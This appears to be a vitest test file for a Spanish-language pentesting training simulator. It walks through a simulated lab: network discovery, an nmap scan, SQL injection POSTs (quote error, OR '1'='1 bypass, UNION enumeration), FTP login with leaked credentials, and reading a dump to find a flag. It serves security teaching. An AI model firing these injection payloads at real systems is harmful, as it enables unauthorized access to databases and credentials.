// ── commands/__tests__/happyPath-scenario06-flow.test.ts ─────────────
// Flujo completo del Lab 06 vía executeCommand + validateMission + store,
// simulando lo que hace checkMissionCompletion en useCommandRunner.

import { describe, it, expect } from 'vitest';
import { scenario_06 } from '../../laboratorios/laboratorio06';
import { useScenarioStore } from '../../store/scenarioStore';
import { executeCommand, resetShellSessions } from '../index';
import { validateMission } from '../../utils/labValidator';
import { setupBeforeEach } from './happyPathHelpers';

setupBeforeEach();

describe('Happy Path: Scenario 06 - flujo completo vía store', () => {
  it('cada comando avanza exactamente una misión en orden', () => {
    const machines = scenario_06.machines;
    const attacker = machines.find(m => m.id.includes('attacker'))!;
    const target = machines.find(m => !m.id.includes('attacker'))!;

    useScenarioStore.setState({
      missions: scenario_06.missions,
      currentMissionId: 1,
    });

    const active = () => useScenarioStore.getState().missions.find(m => m.status === 'active')!;
    const completeActive = () => useScenarioStore.getState().completeMission(active().id);

    // Misión 1: descubrimiento
    let r = executeCommand(`netdiscover -r 192.168.40.0/24`, attacker, machines, active().id, undefined, '/root');
    expect(validateMission(r, active())).toBe(true);
    completeActive();
    expect(active().id).toBe(2);

    // Misión 2: escaneo de puertos
    r = executeCommand(`nmap -sS -p- --min-rate 5000 ${target.machine_info.ip}`, attacker, machines, active().id, undefined, '/root');
    expect(validateMission(r, active())).toBe(true);
    completeActive();
    expect(active().id).toBe(3);

    // Misión 3: identificar SQLi con comilla simple (error SQL)
    r = executeCommand(`curl -X POST http://${target.machine_info.ip}/login -d "username='&password=x"`, attacker, machines, active().id, undefined, '/root');
    expect(validateMission(r, active())).toBe(true);
    completeActive();
    expect(active().id).toBe(4);

    // Misión 4: explotar SQLi con OR bypass
    r = executeCommand(`curl -X POST http://${target.machine_info.ip}/login -d "username=' OR '1'='1&password=x"`, attacker, machines, active().id, undefined, '/root');
    expect(validateMission(r, active())).toBe(true);
    completeActive();
    expect(active().id).toBe(5);

    // Misión 5: enumeración de BD con UNION (revela creds MySQL + ruta del dump)
    r = executeCommand(`curl -X POST http://${target.machine_info.ip}/login -d "username=' UNION SELECT table_name FROM information_schema.tables--&password=x"`, attacker, machines, active().id, undefined, '/root');
    expect(validateMission(r, active())).toBe(true);
    expect(r.output).toContain('root / SQLr00t@2024!');
    expect(r.output).toContain('ftpuser / ftp_dump_2024');
    expect(r.output).toContain('/srv/ftp/database_dump.sql');
    completeActive();
    expect(active().id).toBe(6);
  });

  it('paso 6: login FTP con ftpuser/ftp_dump_2024 y descarga del dump', () => {
    const machines = scenario_06.machines;
    const attacker = machines.find(m => m.id.includes('attacker'))!;
    const target = machines.find(m => !m.id.includes('attacker'))!;

    useScenarioStore.setState({
      missions: scenario_06.missions.map(m => ({
        ...m,
        status: m.id === 6 ? 'active' : 'pending',
      })),
      currentMissionId: 6,
    });
    resetShellSessions();

    const active = () => useScenarioStore.getState().missions.find(m => m.status === 'active')!;

    // Conectar
    let r = executeCommand(`ftp ${target.machine_info.ip}`, attacker, machines, active().id, undefined, '/root');
    expect('ftpSession' in r && r.ftpSession?.active).toBe(true);
    expect('ftpSession' in r && r.ftpSession?.step).toBe('username');

    // Username ftpuser
    r = executeCommand('ftpuser', attacker, machines, active().id, undefined, '/root');
    expect('ftpSession' in r && r.ftpSession?.step).toBe('password');

    // Password correcta → login exitoso
    r = executeCommand('ftp_dump_2024', attacker, machines, active().id, undefined, '/root');
    expect('ftpSession' in r && r.ftpSession?.loggedIn).toBe(true);
    expect(validateMission(r, active())).toBe(true);

    // Descargar dump
    r = executeCommand('get database_dump.sql', attacker, machines, active().id, undefined, '/root');
    expect('downloadedFile' in r && r.downloadedFile?.path).toBe('/root/database_dump.sql');

    resetShellSessions();
  });

  it('paso 6: anonymous no puede leer el dump (solo ftpuser)', () => {
    const machines = scenario_06.machines;
    const attacker = machines.find(m => m.id.includes('attacker'))!;
    const target = machines.find(m => !m.id.includes('attacker'))!;
    resetShellSessions();

    let r = executeCommand(`ftp ${target.machine_info.ip}`, attacker, machines, 1, undefined, '/root');
    r = executeCommand('anonymous', attacker, machines, 1, undefined, '/root');
    r = executeCommand('pass@', attacker, machines, 1, undefined, '/root');
    expect('ftpSession' in r && r.ftpSession?.loggedIn).toBe(true);

    r = executeCommand('get database_dump.sql', attacker, machines, 1, undefined, '/root');
    expect(r.output).toContain('Permission denied');
    resetShellSessions();
  });

  it('paso 7 y 8: leer el dump descargado valida la flag por contenido', () => {
    const machines = scenario_06.machines;
    const attacker = machines.find(m => m.id.includes('attacker'))!;
    const target = machines.find(m => !m.id.includes('attacker'))!;
    const dump = target.files.find(f => f.path === '/srv/ftp/database_dump.sql')!;

    useScenarioStore.setState({
      missions: scenario_06.missions.map(m => ({
        ...m,
        status: m.id === 8 ? 'active' : 'pending',
      })),
      currentMissionId: 8,
    });
    resetShellSessions();

    // Simular el archivo descargado en el atacante (lo que hace handleDownloadedFile)
    useScenarioStore.getState().addFileToMachine(attacker.id, {
      path: '/root/database_dump.sql',
      content: dump.content,
      type: 'text',
      owner: 'root',
      group: 'root',
      mode: 0o644,
    });

    const active = () => useScenarioStore.getState().missions.find(m => m.status === 'active')!;
    const attackerWithFile = {
      ...attacker,
      files: [...attacker.files, { path: '/root/database_dump.sql', content: dump.content, type: 'text', owner: 'root', group: 'root', mode: 0o644 }],
    };

    const r = executeCommand('cat /root/database_dump.sql', attackerWithFile, machines, active().id, undefined, '/root');
    expect(r.output).toContain('ZIL{DATABASE_COMPROMISED}');
    const fr = 'fileRead' in r ? r.fileRead : undefined;
    expect(fr?.isFlag).toBe(true);
    expect(validateMission(r, active())).toBe(true);
  });

  it('paso 8 también valida con pipe + grep (hint 2)', () => {
    const machines = scenario_06.machines;
    const attacker = machines.find(m => m.id.includes('attacker'))!;
    const dump = scenario_06.machines.find(m => !m.id.includes('attacker'))!.files.find(f => f.path === '/srv/ftp/database_dump.sql')!;

    useScenarioStore.setState({
      missions: scenario_06.missions.map(m => ({
        ...m,
        status: m.id === 8 ? 'active' : 'pending',
      })),
      currentMissionId: 8,
    });
    resetShellSessions();

    const attackerWithFile = {
      ...attacker,
      files: [...attacker.files, { path: '/root/database_dump.sql', content: dump.content, type: 'text', owner: 'root', group: 'root', mode: 0o644 }],
    };
    const active = () => useScenarioStore.getState().missions.find(m => m.status === 'active')!;

    const r = executeCommand('cat /root/database_dump.sql | grep -i flag', attackerWithFile, machines, active().id, undefined, '/root');
    expect(r.output.toLowerCase()).toContain('flag');
    const fr = 'fileRead' in r ? r.fileRead : undefined;
    expect(fr?.isFlag).toBe(true);
    expect(validateMission(r, active())).toBe(true);
  });
});
